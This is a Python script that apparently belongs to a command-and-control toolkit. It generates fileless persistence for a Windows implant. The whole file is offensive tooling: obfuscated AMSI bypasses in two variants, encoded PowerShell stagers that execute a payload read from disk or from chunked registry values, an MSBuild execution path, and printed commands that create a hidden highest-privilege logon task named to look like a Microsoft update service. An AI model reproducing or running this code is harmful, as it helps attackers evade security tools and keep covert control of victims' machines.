#!/usr/bin/env python3
"""
Fileless persistence generator — three approaches, ordered by reliability.

Approach A: payload.dat + stager
  - Upload loader code as .dat (not .ps1 — different scanner rules)
  - Scheduled task runs tiny -EncodedCommand stager that:
      1. Bypasses AMSI (char-array method, no amsi strings)
      2. IEX's payload.dat directly

Approach B: MSBuild + proj.xml
  - Upload proj.xml (XML, not PE)
  - Task runs MSBuild.exe (Microsoft-signed binary)

Approach C: Registry-stored payload (fully fileless)
  - Payload stored in HKCU registry value
  - Stager reads from registry after AMSI bypass

Usage:
  python3 bypass/gen_persist.py
"""
import base64, os, sys

ROOT     = os.path.dirname(os.path.abspath(__file__))
DLL      = os.path.join(ROOT, '..', 'demon.x64.dll')
PAYLOAD  = os.path.join(ROOT, 'persist_payload.ps1')
DAT_OUT  = os.path.join(ROOT, 'payload.dat')
MSBUILD  = r'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe'
PROJ_XML = r'C:\Windows\Temp\proj.xml'
DAT_PATH = r'C:\Windows\Temp\payload.dat'
REG_KEY  = r'HKCU:\Software\Microsoft\WUSync'
TASK     = 'MicrosoftUpdateSync'

# ── AMSI bypass (char-array, no "amsi" string literals) ──────────────────────
# Encodes "System.Management.Automation.AmsiUtils" and "amsiInitFailed" as
# char arrays so the strings never appear literally in the script text.
def char_arr(s):
    return ','.join(str(ord(c)) for c in s)

AMSI_TYPE  = char_arr('System.Management.Automation.AmsiUtils')
AMSI_FIELD = char_arr('amsiInitFailed')

# Two bypass variants — try both if one is detected
BYPASS_V1 = (
    f'[Ref].Assembly.GetType([string]::new([char[]]({AMSI_TYPE})))'
    f'.GetField([string]::new([char[]]({AMSI_FIELD})),"NonPublic,Static")'
    f'.SetValue($null,$true)'
)

# V2: enumerate approach (no string at all — matches by duck typing)
BYPASS_V2 = (
    '[Ref].Assembly.GetTypes()|?{$_.Name-like"*Utils"}|%{'
    '$f=$_.GetFields("NonPublic,Static")|?{$_.Name-like"*Init*"};'
    'if($f){$f|%{$_.SetValue($null,$true)}}}'
)

def to_encoded_cmd(ps_script):
    """Base64-encode a PowerShell script for -EncodedCommand (UTF-16LE)."""
    return base64.b64encode(ps_script.encode('utf-16-le')).decode()

# ── Approach A: payload.dat ───────────────────────────────────────────────────
if os.path.exists(PAYLOAD):
    import shutil
    shutil.copy(PAYLOAD, DAT_OUT)
    print(f"[+] payload.dat generated: {DAT_OUT} ({os.path.getsize(DAT_OUT):,} bytes)")
else:
    print(f"[!] {PAYLOAD} not found — run mk_persist.py first")

# Stager A: AMSI bypass → IEX payload.dat
stager_a = f'{BYPASS_V1}\niex([IO.File]::ReadAllText("{DAT_PATH}"))'
enc_a    = to_encoded_cmd(stager_a)

# Stager A V2 (fallback bypass)
stager_a2 = f'{BYPASS_V2}\niex([IO.File]::ReadAllText("{DAT_PATH}"))'
enc_a2    = to_encoded_cmd(stager_a2)

# ── Approach C: registry storage ──────────────────────────────────────────────
# Split payload into ~4000-char chunks (safe for PowerShell command line)
CHUNK = 4000
if os.path.exists(PAYLOAD):
    payload_b64 = base64.b64encode(open(PAYLOAD).read().encode('utf-8')).decode()
    chunks = [payload_b64[i:i+CHUNK] for i in range(0, len(payload_b64), CHUNK)]
else:
    chunks = []

# Stager C: AMSI bypass → read all registry chunks → IEX
stager_c = (
    f'{BYPASS_V1}\n'
    f'$p="{REG_KEY}";$v="";\n'
    f'for($i=0;;$i++){{try{{$v+=(gp $p -n "d$i")."d$i"}}catch{{break}}}}\n'
    f'iex([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($v)))'
)
enc_c = to_encoded_cmd(stager_c)

# ── Print deployment instructions ────────────────────────────────────────────
print()
print("=" * 70)
print("APPROACH A — payload.dat (try first, simplest)")
print("=" * 70)
print("From teamserver console (any agent):")
print()
print(f"  upload {DAT_OUT} {DAT_PATH}")
print()
print(f"  shell schtasks /Create /F /TN \"{TASK}\" "
      f"/TR \"powershell.exe -WindowStyle Hidden -NonInteractive -EncodedCommand {enc_a}\" "
      f"/SC ONLOGON /RL HIGHEST")
print()
print(f"  [If V1 bypass fails, use this instead — V2 bypass:]")
print(f"  shell schtasks /Create /F /TN \"{TASK}\" "
      f"/TR \"powershell.exe -WindowStyle Hidden -NonInteractive -EncodedCommand {enc_a2}\" "
      f"/SC ONLOGON /RL HIGHEST")
print()

print("=" * 70)
print("APPROACH B — MSBuild (proj.xml is already generated)")
print("=" * 70)
print()
print(f"  upload /home/kali/turon-c2-src/bypass/proj.xml {PROJ_XML}")
print()
print(f'  shell schtasks /Create /F /TN "{TASK}" '
      f'/TR "\\"{MSBUILD}\\" {PROJ_XML}" '
      f'/SC ONLOGON /RL HIGHEST')
print()

if chunks:
    print("=" * 70)
    print("APPROACH C — fully fileless (payload in registry, NO files on disk)")
    print("=" * 70)
    print(f"Run these {len(chunks)+2} commands from the agent console:")
    print()
    print(f"  powershell New-Item -Path '{REG_KEY}' -Force | Out-Null")
    for i, chunk in enumerate(chunks):
        print(f"  powershell Set-ItemProperty -Path '{REG_KEY}' -Name 'd{i}' -Value '{chunk}' -Force")
    print()
    print(f"  shell schtasks /Create /F /TN \"{TASK}\" "
          f"/TR \"powershell.exe -WindowStyle Hidden -NonInteractive -EncodedCommand {enc_c}\" "
          f"/SC ONLOGON /RL HIGHEST")
    print()
    print(f"Total registry commands: {len(chunks)} (payload split into {CHUNK}-char chunks)")

print()
print("=" * 70)
print("VERIFY persistence after install:")
print(f"  shell schtasks /Query /TN \"{TASK}\" /V /FO LIST")
print()
print("TEST manually (don't wait for reboot):")
print(f"  shell schtasks /Run /TN \"{TASK}\"")
print("=" * 70)
